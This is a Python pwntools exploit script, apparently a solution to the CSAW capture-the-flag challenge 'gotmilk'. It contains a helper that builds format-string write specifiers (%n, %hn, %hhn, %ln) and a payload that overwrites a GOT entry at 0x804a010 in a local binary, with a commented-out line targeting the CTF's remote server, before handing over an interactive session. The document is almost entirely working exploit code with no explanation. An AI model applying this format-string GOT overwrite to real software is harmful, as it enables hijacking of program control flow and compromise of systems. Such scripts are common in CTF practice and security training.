from pwn import *

def fmt(prev, value, idx, byte=1):
	ln  = "%{}c%{}$ln"
	n   = "%{}c%{}$n"
	hn  = "%{}c%{}$hn"
	hhn = "%{}c%{}$hhn"

	op = {1:hhn, 2:hn, 4:n, 8:ln}
	offset = {1: 0x100, 2: 0x10000, 4:0x100000000, 8:0x10000000000000000}
	if value > prev:
		return op[byte].format(value-prev, idx)
	elif value == prev:
		if byte==1:
			return "%{}$hhn".format(idx)
		elif byte == 2:
			return "%{}$hn".format(idx)
		elif byte == 4:
			return "%{}$n".format(idx)
		elif byte == 8:
			return "%{}$ln".format(idx)
	else:
		return op[byte].format(value-prev+offset[byte], idx)

r = process('./gotmilk', env = {"LD_LIBRARY_PATH":'.'})
#r = remote('pwn.chal.csaw.io', 1004)
lose_got = 0x804a010

payload = fmt(0, 0x89, 11)
payload = payload.ljust(16, 'a')
payload += p32(lose_got)

r.sendlineafter('?', payload)
r.interactive()